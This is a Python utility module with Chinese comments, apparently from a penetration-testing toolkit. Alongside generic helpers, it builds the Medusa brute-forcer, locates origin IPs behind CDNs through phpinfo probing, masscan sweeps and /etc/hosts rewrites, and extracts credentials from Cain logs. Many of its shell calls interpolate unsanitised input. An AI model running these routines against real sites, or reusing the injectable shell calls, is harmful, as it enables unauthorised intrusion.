    # 通过compile命令转成一个js对象
    js_obj = execjs.compile(js)
    res = js_obj.call('SHA1', string)
    return res


def base64encode(string):
    # 得到base64的字符串
    # 输入为str类型
    # 返回为str类型
    import base64
    bytes_string = (string).encode(encoding="utf-8")
    bytesbase64Str = base64.b64encode(bytes_string)
    base64Str = bytesbase64Str.decode()
    return base64Str


def base64decode(string):
    # 得到经过base64加密后字符串解密后的明文
    # 输入为str类型
    # 返回为str类型
    import base64
    return base64.b64decode(string).decode("utf-8")


def is_internal_ip(ip):
    # 判断ip是不是内网ip
    def ip_into_int(ip):
        return reduce(lambda x, y: (x << 8) + y, list(map(int, ip.split('.'))))
    ip = ip_into_int(ip)
    net_a = ip_into_int('10.255.255.255') >> 24
    net_b = ip_into_int('172.31.255.255') >> 20
    net_c = ip_into_int('192.168.255.255') >> 16
    return ip >> 24 == net_a or ip >> 20 == net_b or ip >> 16 == net_c


class CLIOutput(object):
    # 一般用法:正常运行要输出的内容用该类的good_print函数,显示运行状态用new_thread_bottom_print函数,其中
    # 如果要终结new_thread_bottom_print线程,将sefl.stop_order置1即可

    import shlex
    import struct
    import subprocess

    def get_terminal_size(self):
        """ get_terminal_size()
         - get width and height of console
         - works on linux,os x,windows,cygwin(windows)
         originally retrieved from:
         http://stackoverflow.com/questions/566746/how-to-get-console-window-width-in-python
        """
        current_os = platform.system()
        tuple_xy = None
        if current_os == 'Windows':
            tuple_xy = self._get_terminal_size_windows()
            if tuple_xy is None:
                tuple_xy = self._get_terminal_size_tput()
                # needed for window's python in cygwin's xterm!
        if current_os in ['Linux', 'Darwin'] or current_os.startswith('CYGWIN'):
            tuple_xy = self._get_terminal_size_linux()
        if tuple_xy is None:
            # print("default")
            tuple_xy = (80, 25)      # default value
        return tuple_xy

    def _get_terminal_size_windows(self):
        try:
            from ctypes import windll, create_string_buffer
            # stdin handle is -10
            # stdout handle is -11
            # stderr handle is -12
            h = windll.kernel32.GetStdHandle(-12)
            csbi = create_string_buffer(22)
            res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
            if res:
                (bufx, bufy, curx, cury, wattr,
                 left, top, right, bottom,
                 maxx, maxy) = struct.unpack("hhhh_hhhhhhh", csbi.raw)
                sizex = right - left + 1
                sizey = bottom - top + 1
                return sizex, sizey
        except:
            pass

    def _get_terminal_size_tput(self):
        # get terminal width
        # src:
        # http://stackoverflow.com/questions/263890/how-do-i-find-the-width-height-of-a-terminal-window
        try:
            cols = int(subprocess.check_call(shlex.split('tput cols')))
            rows = int(subprocess.check_call(shlex.split('tput lines')))
            return (cols, rows)
        except:
            pass

    def _get_terminal_size_linux(self):
        def ioctl__g_w_i_n_sZ(fd):
            try:
                import fcntl
                import termios
                cr = struct.unpack('hh',
                                   fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
                return cr
            except:
                pass
        cr = ioctl__g_w_i_n_sZ(0) or ioctl__g_w_i_n_sZ(
            1) or ioctl__g_w_i_n_sZ(2)
        if not cr:
            try:
                fd = os.open(os.ctermid(), os.O_RDONLY)
                cr = ioctl__g_w_i_n_sZ(fd)
                os.close(fd)
            except:
                pass
        if not cr:
            try:
                cr = (os.environ['LINES'], os.environ['COLUMNS'])
            except:
                return None
        return int(cr[1]), int(cr[0])

    def __init__(self):
        # 这里为什么要调用scan_init()函数呢,奇怪,可能是手抖
        # scan_init()
        self.last_length = 0
        self.last_output = ''
        self.last_in_line = False
        self.mutex = threading.Lock()
        self.blacklists = {}
        self.mutex_checked_paths = threading.Lock()
        self.base_path = None
        self.errors = 0
        self.use_proxy = False

        # 下面这个变量是用来控制屏幕底部输出结束的,self.stop_order=1时,结束在屏幕底部输出的线程
        self.stop_order = 0

    def in_line(self, string):
        self.erase()
        sys.stdout.write(string)
        sys.stdout.flush()
        self.last_in_line = True

    def erase(self):
        if platform.system() == 'Windows':
            csbi = GetConsoleScreenBufferInfo()
            line = "\b" * int(csbi.dw_cursor_position.X)
            sys.stdout.write(line)
            width = csbi.dw_cursor_position.X
            csbi.dw_cursor_position.X = 0
            FillConsoleOutputCharacter(
                STDOUT, ' ', width, csbi.dw_cursor_position)
            sys.stdout.write(line)
            sys.stdout.flush()
        else:
            sys.stdout.write('\033[1K')
            sys.stdout.write('\033[0G')

    def new_line(self, string):
        if self.last_in_line:
            self.erase()
        if platform.system() == 'Windows':
            sys.stdout.write(string)
            sys.stdout.flush()
            sys.stdout.write('\n')
            sys.stdout.flush()
        else:
            sys.stdout.write(string + '\n')
        sys.stdout.flush()
        self.last_in_line = False
        sys.stdout.flush()

    def good_print(self, message, color='green'):
        # 干净的打印,配合下面的new_thread_bottom_print函数使用不会导致多线程打印错乱
        # message是要打印的string
        # color有green,blue,yellow,cyan,red的选择
        with self.mutex:
            if color == 'green':
                message = Fore.GREEN + message + Style.RESET_ALL
            if color == 'blue':
                message = Fore.BLUE + message + Style.RESET_ALL
            if color == 'yellow':
                message = Fore.YELLOW + message + Style.RESET_ALL
            if color == 'cyan':
                message = Fore.CYAN + message + Style.RESET_ALL
            if color == 'red':
                message = Fore.RED + message + Style.RESET_ALL
            self.new_line(message)

    def bottom_print(self, message, color="red"):
        with self.mutex:
            x, y = self.get_terminal_size()
            if self.errors > 0:
                message += Style.BRIGHT + Fore.RED
                message += 'Errors: {0}'.format(self.errors)
                message += Style.RESET_ALL
            # if len(message) > x:
            #    message = message[:x]
            if color == 'green':
                message = Fore.GREEN + message
            if color == 'blue':
                message = Fore.BLUE + message
            if color == 'yellow':
                message = Fore.YELLOW + message
            if color == 'red':
                message = Fore.RED + message
            self.in_line(message)

    def error(self, reason):
        with self.mutex:
            stripped = reason.strip()
            start = reason.find(stripped[0])
            end = reason.find(stripped[-1]) + 1
            message = reason[0:start]
            message += Style.BRIGHT + Fore.WHITE + Back.RED
            message += reason[start:end]
            message += Style.RESET_ALL
            message += reason[end:]
            self.new_line(message)

    def warning(self, reason):
        message = Style.BRIGHT + Fore.YELLOW + reason + Style.RESET_ALL
        self.new_line(message)

    def header(self, text):
        message = Style.BRIGHT + Fore.MAGENTA + text + Style.RESET_ALL
        self.new_line(message)

    def debug(self, info):
        line = "[{0}] - {1}".format(time.strftime('%H:%M:%S'), info)
        self.new_line(line)

    def continue_bottom_print(self, message):
        # 底部持续打印,可以起到显示当前状态作用
        # stop_order是结束信号,一般是全局变量
        # 在设置stop_order=1之后再设置stop_order=0前要睡3s左右,以便留点时间给stop_order=1后用来退出下面的新线程的无限循环
        # eg.
        # self.stop_order=1
        # time.sleep(3)
        # self.stop_order=0
        # new thread:continue_bottom_print(....)

        while 1:
            if self.stop_order == 1:
                break
            self.bottom_print(message)
            if self.stop_order == 1:
                break
            time.sleep(1)
            if self.stop_order == 1:
                break

    def new_thread_bottom_print(self, message):
        # stop_order是结束信号,一般是全局变量
        # 这个函数是新开线程在屏幕底部单独一行打印的函数
        # message是要打印的string
        bottom_print_thread = MyThread(self.continue_bottom_print, [message])
        bottom_print_thread.start()

    def os_system_with_bottom_status(self, command, proxy_url=""):
        # 这个函数是在os.system函数的基础上在命令执行期间打印当前正在执行的命令到屏幕底部的函数
        # command是要执行的命令,这个函数调用了上面的new_thread_bottom_print函数,并利用当前类的self.stop_order
        # 作为打印开关
        # 但是一般来说会出现在非屏幕底部也会打印屏幕底部正在打印的string,因为一般的os.system执行的命令中的打印的
        # string没有上面的good_print函数好,一般的os.system执行的命令中的打印动作相当于print
        self.stop_order = 0
        if not self.use_proxy:
            command = command
        else:
            command = command + " --proxy=%s" % get_one_useful_proxy()
        self.new_thread_bottom_print("[正在执行:%s]\r" % command)
        os.system(command)
        self.stop_order = 1

    def os_system_combine_argv_with_bottom_status(self, command, proxy_url=""):
        # 这个函数是在os_system_with_bottom_status函数的基础上结合程序输入参数而执行命令的函数
        # command的优先级没有argv中的参数优先级高,如果在argv中有与command中相同的参数则取argv中的参数与对应对
        # 数值作为最后执行参数
        command = combile_my_para_and_argv_para(command)
        self.stop_order = 0
        if not self.use_proxy:
            command = command
        else:
            command = re.sub(r"--proxy[\s]+[^\s]+", "", command)
            command = command + " --proxy=%s" % get_one_useful_proxy()
        self.new_thread_bottom_print("[正在执行:%s]\r" % command)
        os.system(command)
        self.stop_order = 1
        import time
        # 这里睡1s给new_thread_bottom_print里面的打印线程发送stop_order=1的响应时间,不睡发现它响应不过来
        time.sleep(1)


# 一般用法:正常运行要输出的内容用该类的good_print函数,显示运行状态用new_thread_bottom_print函数,其中
# 如果要终结new_thread_bottom_print线程,将sefl.stop_order置1即可
# 上面是彩色打印输出到屏幕方案相关代码


def string2argv(string):
    # 将string转化成argv格式
    # 返回一个列表
    # eg:
    # -u 'http://1.php' --dbms=mysql -v 3将转化成:
    # ['-u','http://1.php','--dbms','mysql','-v','3']
    # 最后将--url转化成-u,因为sqlmap中需要
    import re
    tmp_word = ""
    # 引号个数
    yh_index = 0
    # 表示开始进入引号中内容
    start_y_hcontent = 0
    # 表示结束引号中内容
    end_y_hcontent = 0
    command_list = []
    for c in string:
        if re.match('''[^\s'"]''', c):
            tmp_word += c
        elif re.match("\s", c):
            if tmp_word != "" and start_y_hcontent == 0:
                command_list.append(tmp_word)
            if start_y_hcontent == 1 and end_y_hcontent == 0:
                tmp_word += c
            if start_y_hcontent == 0:
                tmp_word = ""
        elif c in ["'", '"']:
            yh_index += 1
            if yh_index % 2 == 0:
                end_y_hcontent = 1
                start_y_hcontent = 0
                # command_list.append(tmp_word)
                tmp_word == ""
            else:
                start_y_hcontent = 1
                end_y_hcontent = 0
    if tmp_word != "":
        command_list.append(tmp_word)
    return_list = []
    for each in command_list:
        if not re.match("http", each) and re.search("=", each) and each[0:2] == "--":
            tmp_list = each.split("=")
            return_list.append(tmp_list[0])
            return_list.append(tmp_list[1])
        else:
            return_list.append(each)

    tmp_list = []
    for each in return_list:
        if each == "--url":
            tmp_list.append("-u")
        else:
            tmp_list.append(each)

    return tmp_list


def param2argv(param_list):
    # 将形如['-u','http://a b1.php','--dbms=mysql','-v','3']转化成
    #['-u','http://a b1.php','--dbms','mysql','-v','3']
    # 最后将--url转化成-u,因为sqlmap中需要
    import re
    return_list = []
    for each in param_list:
        if not re.match("http", each) and re.search("=", each) and each[0:2] == "--":
            tmp_list = each.split('=')
            return_list.append(tmp_list[0])
            return_list.append(tmp_list[1])
        else:
            return_list.append(each)

    tmp_list = []
    for each in return_list:
        if each == "--url":
            tmp_list.append("-u")
        else:
            tmp_list.append(each)

    return tmp_list


def install_scrapy():
    # ubuntu 16.04下安装scrapy
    os.system(
        "sudo apt-get -y install python-dev python-pip libxml2-dev libxslt1-dev zlib1g-dev libffi-dev \
libssl-dev")
    os.system("pip3 install Scrapy")


def install_medusa():
    # linux mint下安装medusa
    # 下面用于支持ssh爆破
    os.system("wget http://www.libssh2.org/download/libssh2-1.2.6.tar.gz -O /tmp/libssh2.tar.gz && cd \
/tmp && tar -xvzf libssh2.tar.gz -C /usr/src && cd /usr/src/libssh2-1.2.6/ && ./configure && make && make install")
    os.system("echo /usr/local/lib > /etc/ld.so.conf.d/local.conf && ldconfig")
    # 下面安装一些依赖,可解决rdp模块的问题
    os.system("apt-get -y install build-essential libssl-dev libpq5 libpq-dev libssh2-1 libssh2-1-dev libgcrypt11-dev libgnutls-dev libsvn-dev freerdp libfreerdp-dev")
    # 下面下载并编译
    os.system("wget https://codeload.github.com/jmk-foofus/medusa/tar.gz/2.2 -O /tmp/medusa.tar.gz && \
cd /tmp && tar -xvzf medusa.tar.gz && cd medusa-2.2 && ./configure --enable-debug=yes --enable-module-afp=yes \
--enable-module-cvs=yes --enable-module-ftp=yes --enable-module-http=yes --enable-module-imap=yes \
--enable-module-mssql=yes --enable-module-mysql=yes --enable-module-ncp=yes --enable-module-nntp=yes \
--enable-module-pcanywhere=yes --enable-module-pop3=yes --enable-module-postgres=yes \
--enable-module-rexec=yes --enable-module-rlogin=yes --enable-module-rsh=yes --enable-module-smbnt=yes \
--enable-module-smtp=yes --enable-module-smtp-vrfy=yes --enable-module-snmp=yes --enable-module-ssh=yes \
--enable-module-svn=yes --enable-module-telnet=yes --enable-module-vmauthd=yes --enable-module-vnc=yes \
--enable-module-wrapper=yes --enable-module-web-form=yes --enable-module-rdp=yes && make && make install")


def file_outof_date(file, check_time=3):
    # 文件距离上次修改后到现在为止经过多久,如果超过check_time的天数则认为文件过期,返回True
    # 如果没有超过3天则认为文件没有过期,返回False
    import os
    import time
    now_month = int(time.strftime("%m"))
    now_date = int(time.strftime("%d"))
    t = os.stat(file)
    a = time.localtime(t.st_mtime)
    modify_month = a.tm_mon
    modify_date = a.tm_mday
    if modify_month != now_month:
        return True
    if modify_month == now_month:
        if now_date - modify_date > check_time:
            return True
        elif now_date < modify_date:
            return True
        else:
            return False


def tab_complete_file_path():
    # this is a function make system support Tab key complete file_path
    # works on linux,it seems windows not support readline module
    import platform
    import glob
    import readline

    def tab_complete_for_file_path():
        class tab_completer(object):
            """
            A tab completer that can either complete from
            the filesystem or from a list.
            Partially taken from:
            http://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
            source code:https://gist.github.com/iamatypeofwalrus/5637895
            """

            def path_completer(self, text, state):
                """
                This is the tab completer for systems paths.
                Only tested on *nix systems
                """
                # line = readline.get_line_buffer().split()
                return [x for x in glob.glob(text + '*')][state]

            def create_list_completer(self, ll):
                """
                This is a closure that creates a method that autocompletes from
                the given list.
                Since the autocomplete function can't be given a list to complete from
                a closure is used to create the list_completer function with a list to complete
                from.
                """
                def list_completer(text, state):
                    line = readline.get_line_buffer()
                    if not line:
                        return [
                            c + " " for c in ll if c.startswith(line)][state]
                self.list_completer = list_completer
        t = tab_completer()
        t.create_list_completer(["ab", "aa", "bcd", "bdf"])

        readline.set_completer_delims('\t')
        readline.parse_and_bind("tab: complete")
        # readline.set_completer(t.list_completer)
        # ans = raw_input("Complete from list ")
        # print ans
        readline.set_completer(t.path_completer)

    if platform.system() == "Linux":
        try:
            import readline
            tab_complete_for_file_path()
        except:
            os.system("pip3 install readline")
            tab_complete_for_file_path()
    else:
        try:
            import readline
        except:
            pass


# execute the function to take effect
if platform.system()!="Windows":
    tab_complete_file_path()


def seconds2hms(seconds):
    # 将秒数转换成时分秒
    # 返回类型为str类型
    m, s = divmod(seconds, 60)
    h, m = divmod(m, 60)
    return "%02d:%02d:%02d" % (h, m, s)


def checkvpn(proxies={}):
    # 查看是否能连通google
    try:
        rsp=requests.get("https://www.google.com",timeout=30,proxies=proxies)
    except:
        return 0
    return 1


class Xcdn(object):
    # Xcdn是获取cdn背后真实ip的类
    # 使用方法Xcdn(domain).return_value为真实ip,如果结果为0代表没有获得成功

    def __init__(self, domain):
        # 必须保证连上了vpn,要在可以ping通google的条件下使用本工具,否则有些domain由于被GFW拦截无法正常访问会导致
        # 本工具判断错误,checkvpn在可以ping通google的条件下返回1
        import os
        if re.match(r"(\d+\.){3}\d+", domain):
            print(
                "Your input domain is an ip,I will return the ip direcly as the actual address")
            self.return_value = domain
            return
        while 1:
            if checkvpn() == 1:
                break
            else:
                time.sleep(1)
                print("vpn is off,connect vpn first")
        # 首先保证hosts文件中没有与domain相关的项,有则删除相关
        domain_pattern = domain.replace(".", "\.")
        # 下面的sed的正则中不能有\n,sed匹配\n比较特殊
        # http://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed
        command = "sed -ri 's/.*\s+%s//' /etc/hosts" % domain_pattern
        os.system(command)

        self.domain = domain
        self.http_or_https = get_http_or_https(self.domain)
        print('domain的http或https是:%s' % self.http_or_https)
        result = get_request(self.http_or_https + "://" + self.domain)
        #result = get_request(self.http_or_https + "://" + self.domain,'selenium_phantom_js')
        self.domain_title = result['title']
        # 下面调用相当于main函数的get_actual_ip_from_domain函数
        actual_ip = self.get_actual_ip_from_domain()
        if actual_ip != 0:
            print("恭喜,%s的真实ip是%s" % (self.domain, actual_ip))
        # 下面用来存放关键返回值
        self.return_value = actual_ip

    def domain_has_cdn(self):
        # 检测domain是否有cdn
        # 有cdn时,返回一个字典,如果cdn是cloudflare，返回{'has_cdn':1,'is_cloud_flare':1}
        # 否则返回{'has_cdn':1,'is_cloud_flare':0}或{'has_cdn':0,'is_cloud_flare':0}
        import re
        CLIOutput().good_print("现在检测domain:%s是否有cdn" % self.domain)
        # has_cdn = 0
        # ns记录和mx记录一样,都要查顶级域名,eg.dig +short www.baidu.com ns VS dig +short
        # baidu.com ns
        result = get_string_from_command(
            "dig ns %s +short" % get_root_domain(self.domain))
        pattern = re.compile(
            r"(cloudflare)|(cdn)|(cloud)|(fast)|(incapsula)|(photon)|(cachefly)|(wppronto)|(softlayer)|(incapsula)|(jsdelivr)|(akamai)", re.I)
        cloudflare_pattern = re.compile(r"cloudflare", re.I)
        if re.search(pattern, result):
            if re.search(cloudflare_pattern, result):
                print("has_cdn=1 from ns,and cdn is cloudflare")
                return {'has_cdn': 1, 'is_cloud_flare': 1}
            else:
                print("has_cdn=1 from ns")
                return {'has_cdn': 1, 'is_cloud_flare': 0}
        else:
            # 下面通过a记录个数来判断,如果a记录个数>1个,认为有cdn
            result = get_string_from_command("dig a %s +short" % self.domain)
            find_a_record_pattern = re.findall(
                r"((\d{1,3}\.){3}\d{1,3})", result)
            if find_a_record_pattern:
                ip_count = 0
                for each in find_a_record_pattern:
                    ip_count += 1
                if ip_count > 1:
                    return {'has_cdn': 1, 'is_cloud_flare': 0}
        return {'has_cdn': 0, 'is_cloud_flare': 0}

    def get_domain_actual_ip_from_phpinfo(self):
        # 从phpinfo页面尝试获得真实ip
        CLIOutput().good_print("现在尝试从domain:%s可能存在的phpinfo页面获取真实ip" % self.domain)
        phpinfo_page_list = ["info.php", "phpinfo.php", "test.php", "l.php"]
        for each in phpinfo_page_list:
            url = self.http_or_https + "://" + self.domain + "/" + each
            CLIOutput().good_print("现在访问%s" % url)
            visit = get_request(url)
            #visit = get_request(url, 'selenium_phantom_js')
            code = visit['code']
            content = visit['content']
            pattern = re.compile(r"remote_addr", re.I)
            if code == 200 and re.search(pattern, content):
                print(each)
                actual_ip = re.search(
                    r"REMOTE_ADDR[^\.\d]+([\d\.]{7,15})[^\.\d]+", content).group(1)
                return actual_ip
        # return 0代表没有通过phpinfo页面得到真实ip
        return 0

    def flush_dns(self):
        # 这个函数用来刷新本地dns cache
        # 要刷新dns cache才能让修改hosts文件有效

        #CLIOutput().good_print("现在刷新系统的dns cache")
        sys_info = get_string_from_command("uname -a")
        if re.search(r"kali", sys_info, re.I) and re.search(r"debian", sys_info, re.I):
            # 说明是kali linux,如果使用的时默认的get_request方法(非selenium)kali
            # linux不刷新dns时/etc/hosts也生效
            pass
        elif re.search(r"ubuntu", sys_info, re.I):
            # 说明是ubuntu,ubuntu刷新dns方法如下,按理来说这里不刷新dns也可，因为默认的get_request请求不用刷新dns
            # 时/etc/hosts也生效，在kali linux上测试是这样的，ubuntu下暂时没有测试
            # command = "/etc/init.d/dns-clean start && /etc/init.d/networking force-reload"
            # 改成不刷新dns了，好的刷新多少会断网,因为这里有networking force-reload
            # os.system(command)
            pass
        else:
            print(
                "Sorry,I don't support your operation system since it's not kali linux or ubuntu")
            sys.exit(1)
        import time
        time.sleep(3)

    def modify_hosts_file_with_ip_and_domain(self, ip):
        # 这个函数用来修改hosts文件
        CLIOutput().good_print("现在修改hosts文件")
        exists_domain_line = False
        with open("/etc/hosts", "r+") as f:
            file_content = f.read()
        if re.search(r"%s" % self.domain.replace(".", "\."), file_content):
            exists_domain_line = True
        if exists_domain_line:
            os.system("sed -ri 's/.*%s.*/%s    %s/' %s" %
                      (self.domain.replace(".", "\."), ip, self.domain, "/etc/hosts"))
        else:
            os.system("echo %s %s >> /etc/hosts" % (ip, self.domain))

    def check_if_ip_is_actual_ip_of_domain(self, ip):
        # 通过修改hosts文件检测ip是否是domain对应的真实ip
        # 如果是则返回True,否则返回False
        CLIOutput().good_print("现在通过修改hosts文件并刷新dns的方法检测ip:%s是否是domain:%s的真实ip" % (ip,
                                                                                   self.domain))
        os.system("cp /etc/hosts /etc/hosts.bak")
        self.modify_hosts_file_with_ip_and_domain(ip)
        self.flush_dns()
        # 使用默认的get_request请求方法不刷新dns的话/etc/hosts文件也会生效
        hosts_changed_domain_title = get_request(
            self.http_or_https + "://%s" % self.domain)['title']
        #hosts_changed_domain_title = get_request(self.http_or_https + "://%s" % self.domain, 'selenium_phantom_js')['title']
        os.system("rm /etc/hosts && mv /etc/hosts.bak /etc/hosts")
        # 这里要用title判断,html判断不可以,title相同则认为相同
        if self.domain_title == hosts_changed_domain_title:
            print("是的！！！！！！！！！！！！")
            return True
        else:
            print("不是的！！！！！！！！！！！！")
            return False

    def get_c_80_or_443_list(self, ip):
        # 得到ip的整个c段的开放80端口或443端口的ip列表
        if "not found" in get_string_from_command("masscan"):
            # 这里不用nmap扫描,nmap扫描结果不准
            os.system("apt-get -y install masscan")
        if self.http_or_https == "http":
            scan_port = 80
            CLIOutput().good_print("现在进行%s的c段开了80端口机器的扫描" % ip)
        if self.http_or_https == "https":
            scan_port = 443
            CLIOutput().good_print("现在进行%s的c段开了443端口机器的扫描" % ip)
        masscan_command = "masscan -p%d %s/24 > /tmp/masscan.out" % (
            scan_port, ip)
        os.system(masscan_command)
        with open("/tmp/masscan.out", "r+") as f:
            strings = f.read()
        # os.system("rm /tmp/masscan.out")
        import re
        all_iP = re.findall(r"((\d{1,3}\.){3}\d{1,3})", strings)
        ip_list = []
        for each in all_iP:
            ip_list.append(each[0])
        print(ip_list)
        return ip_list

    def check_if_ip_c_machines_has_actual_ip_of_domain(self, ip):
        # 检测ip的c段有没有domain的真实ip,如果有则返回真实ip,如果没有则返回0
        CLIOutput().good_print("现在检测ip为%s的c段中有没有%s的真实ip" % (ip, self.domain))
        target_list = self.get_c_80_or_443_list(ip)
        for each_ip in target_list:
            if self.check_if_ip_is_actual_ip_of_domain(each_ip):
                return each_ip
        return 0

    def get_ip_from_mx_record(self):
        # 从mx记录中得到ip列表,尝试从mx记录中的c段中找真实ip
        print("尝试从mx记录中找和%s顶级域名相同的mx主机" % self.domain)
        import socket
        # domain.eg:www.baidu.com
        root_domain = get_root_domain(self.domain)
        result = get_string_from_command("dig %s +short mx" % root_domain)
        sub_domains_list = re.findall(
            r"\d{1,} (.*\.%s)\." % root_domain.replace(".", "\."), result)
        ip_list = []
        for each in sub_domains_list:
            print(each)
            ip = socket.gethostbyname_ex(each)[2]
            if ip[0] not in ip_list:
                ip_list.append(ip[0])
        return ip_list

    def check_if_mx_c_machines_has_actual_ip_of_domain(self):
        # 检测domain的mx记录所在ip[或ip列表]的c段中有没有domain的真实ip
        # 有则返回真实ip,没有则返回0
        CLIOutput().good_print("尝试从mx记录的c段中查找是否存在%s的真实ip" % self.domain)
        ip_list = self.get_ip_from_mx_record()
        if ip_list != []:
            for each_ip in ip_list:
                result = self.check_if_ip_c_machines_has_actual_ip_of_domain(
                    each_ip)
                if result != 0:
                    return result
                else:
                    continue
        return 0

    def get_ip_value_from_online_cloudflare_interface(self):
        # 从在线的cloudflare查询真实ip接口处查询真实ip
        # 如果查询到真实ip则返回ip值,如果没有查询到则返回0
        CLIOutput().good_print("现在从在线cloudflare类型cdn查询真实ip接口尝试获取真实ip")
        url = "http://www.crimeflare.com/cgi-bin/cfsearch.cgi"
        post_data = 'cfS=%s' % self.domain
        content = post_request(url, post_data)
        find_ip = re.search(r"((\d{1,3}\.){3}\d{1,3})", content)
        if find_ip:
            return find_ip.group(1)
        return 0

    def get_actual_ip_from_domain(self):
        # 尝试获得domain背后的真实ip,前提是domain有cdn
        # 如果找到了则返回ip,如果没有找到返回0
        CLIOutput().good_print("进入获取真实ip函数,认为每个domain都是有cdn的情况来处理")
        import socket
        has_cdn_value = self.domain_has_cdn()
        if has_cdn_value['has_cdn'] == 1:
            CLIOutput().good_print("检测到domain:%s的A记录不止一个,认为它有cdn" % self.domain)
            pass
        else:
            CLIOutput().good_print(
                "Attention...!!! Domain doesn't have cdn,I will return the only one ip")
            try:
                true_ip = socket.gethostbyname_ex(self.domain)[2][0]
                return true_ip
            except:
                # 如果无法由dns解析成ip的域名返回0
                return 0
        # 下面尝试通过cloudflare在线查询真实ip接口获取真实ip
        if has_cdn_value['is_cloud_flare'] == 1:
            ip_value = self.get_ip_value_from_online_cloudflare_interface()
            if ip_value != 0:
                return ip_value
            else:
                pass
        # 下面尝试通过可能存在的phpinfo页面获得真实ip
        ip_from_phpinfo = self.get_domain_actual_ip_from_phpinfo()
        if ip_from_phpinfo == 0:
            pass
        else:
            return ip_from_phpinfo
        # 下面通过mx记录来尝试获得真实ip
        result = self.check_if_mx_c_machines_has_actual_ip_of_domain()
        if result == 0:
            pass
        else:
            return result
        print("很遗憾,在下认为%s有cdn,但是目前在下的能力没能获取它的真实ip,当前函数将返回0" % self.domain)
        return 0


def figlet2file(logo_str, file_abs_path, print_or_not):
    # 输出随机的logo文字到文件或屏幕,第二个参数为0时,只输出到屏幕
    # apt-get install figlet
    # man figlet
    # figure out which is the figlet's font directory
    # my figlet font directory is:
    # figlet -I 2,output:/usr/share/figlet

    try:
        f = os.popen("figlet -I 2")
        all = f.readlines()
        f.close()
        figlet_font_dir = all[0][:-1]
    except:
        if platform.system() == "Linux":
            os.system("apt-get -y install figlet")
            f = os.popen("figlet -I 2")
            all = f.readlines()
            f.close()
            figlet_font_dir = all[0][:-1]
        elif platform.system() == 'Darwin':
            print("use noroot user run `brew install figlet`")
            #os.system("brew install figlet")

    all_font_name_list = get_all_file_name(figlet_font_dir, ['tlf', 'flf'])
    random_font = random.choice(all_font_name_list)
    if platform.system() == "Linux":
        unsucceed = os.system(
            "figlet -t -f %s %s > /tmp/figlettmpfile" %
            (random_font, logo_str))
    elif platform.system() == "Darwin":
        unsucceed = os.system(
            "figlet %s > /tmp/figlettmpfile" %
            logo_str)

    if(unsucceed == 1):
        print("something wrong with figlet,check the command in python source file")
    if file_abs_path != 0:
        try:
            os.system("cat /tmp/figlettmpfile >> %s" % file_abs_path)
        except:
            print("figlet2file func write to file wrong,check it")
    else:
        pass
    if(print_or_not):
        os.system("cat /tmp/figlettmpfile")
    os.system("rm /tmp/figlettmpfile")


def oneline2nline(oneline, nline, file_abs_path):
    # 将文件中的一行字符串用多行字符串替换,调用时要将"多行字符串的参数(第二个参数)"中的换行符设置为\n
    tmpstr = nline.replace('\n', '\\\n')
    os.system("sed '/%s/c\\\n%s' %s > /tmp/1" %
              (oneline, tmpstr, file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    pass


def lin2win(file_abs_path):
    # 将linux下的文件中的\n换行符换成win下的\r\n换行符
    input_file = file_abs_path
    f = open(input_file, "r+")
    urls = f.readlines()
    f.close()
    os.system("rm %s" % file_abs_path)
    f1 = open(file_abs_path, "a+")
    for url in urls:
        print(url[0:-1])
        # print url is different with print url[0:-1]
        # print url[0:-1] can get the pure string
        # while print url will get the "unseen \n"
        # this script can turn a file with strings
        # end with \n into a file with strings end
        # with \r\n to make it comfortable move the
        # txt file from *nix to win,coz the file with
        # strings end with \n in *nix is ok for human
        # to see "different lines",but this kind of file
        # will turn "unsee different lines" in win
        f1.write(url[0:-1] + "\r\n")
    f1.close()


def get_cain_key(lst_file):
    # 参数为cain目录下的包含用户名口令的文件,eg.pop3.lst,imap.lst,smtp.lst,http.lst,ftp.lst...
    # 效果为在程序当前目录下生成一个xxx-cain_out_put.txt为整理后的文件
    import re
    with open(lst_file, "r+") as f:
        all_lines = f.readlines()
    AddedLines = []
    for each_line in all_lines:
        a = re.search(
            r"[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+).*\s", each_line, re.I)
        if a:
            user_field = a.group(1)
            pass_field = a.group(2)
            string2write = user_field + ":" + pass_field + "\n"
            print(string2write)
            if string2write not in AddedLines:
                should_write = 1
                for each in AddedLines:
                    if each[:len(user_field)] != user_field:
                        continue
                    else:
                        if pass_field == each.split(":")[1][:-1]:
                            should_write = 0
                        break
                if should_write == 1:
                    AddedLines.append(string2write)
                    with open(lst_file + "-cain_out_put.txt", "a+") as f:
                        f.write(string2write)


# attention:
# 由于此处tmp_get_file_name_value和tmp_all_file_name_list在函数外面,so
# 在其他代码中调用get_all_file_name()时要用from name import *,不用import name
# 否则不能调用到get_all_file_name的功能
#tmp_get_file_name_value = 0
#tmp_all_file_name_list = []


def post_requests(url, data, headers):
    import requests
    '''
    global DELAY
    if DELAY != "":
        import time
        time.sleep(DELAY)
    else:
        pass
    '''

    return_value = requests.post(url, data, headers, timeout=30,verify=False)
    return return_value


def get_all_abs_path_file_name(folder, ext_list):
    # ext_list为空时,得到目录下的所有绝对路径形式的文件名,不返回空文件夹名
    # ext_list为eg.['jpg','png']
    # eg.folder="~"时,当~目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt
    # 得到的函数返回值为['a/1.txt','2.txt']

    tmp_all_file_name_list = []

    def get_all_abs_path_file_name_inside_func(f, e):
        folder = f
        ext_list = e
        import os
        allfile = os.listdir(folder)
        for each in allfile:
            each_abspath = os.path.join(folder, each)
            if os.path.isdir(each_abspath):
                get_all_abs_path_file_name_inside_func(each_abspath, ext_list)
            else:
                if len(ext_list) == 0:
                    tmp_all_file_name_list.append(each_abspath)
                else:
                    for each_ext in ext_list:
                        if(each_abspath.split('.')[-1] == each_ext):
                            # print filename
                            tmp_all_file_name_list.append(each_abspath)
        return tmp_all_file_name_list
    return get_all_abs_path_file_name_inside_func(folder, ext_list)


def get_all_file_name(folder, ext_list):
    # ext_list为空时,得到目录下的所有文件名,不返回空文件夹名
    # ext_list为eg.['jpg','png']
    # 返回结果为文件名列表,不是完全绝对路径名
    # eg.folder="~"时,当~目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt
